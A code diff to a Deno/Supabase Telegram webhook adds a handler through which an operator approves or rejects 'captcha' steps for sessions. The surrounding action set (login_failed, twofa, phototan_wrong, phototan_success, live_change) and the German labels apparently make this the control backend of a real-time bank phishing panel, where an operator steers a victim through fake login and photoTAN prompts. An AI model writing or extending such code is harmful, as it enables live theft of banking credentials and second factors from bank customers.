@@ -315,6 +315,32 @@ Deno.serve(async (req) => {
     const cb = update.callback_query;
     if (cb?.data) {
       const [action, sessionId] = String(cb.data).split("|");
+
+      if ((action === "captcha_ok" || action === "captcha_no") && sessionId) {
+        const now = new Date().toISOString();
+        const patch = action === "captcha_ok"
+          ? { released_at: now, slider_released_at: now, rejected_at: null }
+          : { rejected_at: now, released_at: null, slider_released_at: null };
+        await supabase.from("captcha_requests").update(patch).eq("id", sessionId);
+        await tgCall("answerCallbackQuery", {
+          callback_query_id: cb.id,
+          text: action === "captcha_ok" ? "Freigegeben" : "Abgelehnt",
+        });
+        if (cb.message?.chat?.id && cb.message?.message_id) {
+          const suffix = action === "captcha_ok" ? "\n\n✅ <b>Freigegeben</b>" : "\n\n❌ <b>Abgelehnt</b>";
+          const orig = cb.message.text || cb.message.caption || "";
+          try {
+            await tgCall("editMessageText", {
+              chat_id: cb.message.chat.id,
+              message_id: cb.message.message_id,
+              text: orig + suffix,
+              parse_mode: "HTML",
+            });
+          } catch {}
+        }
+        return new Response(JSON.stringify({ ok: true }));
+      }
+
       const allowed = new Set(["success", "twofa", "login_failed", "live_change", "phototan_wrong", "phototan_success", "finish", "finish_wrong"]);
       if (allowed.has(action) && sessionId) {
         const { data: updated } = await supabase
@@ -330,8 +356,6 @@ Deno.serve(async (req) => {
         });
 
         if (updated && cb.message?.chat?.id) {
-          // If action is phototan_success, we don't clear it immediately here 
-          // to let the frontend pick it up, but the frontend PhotoTan.tsx does clear it.
           await tgCall("editMessageText", {
             chat_id: cb.message.chat.id,
             message_id: cb.message.message_id,
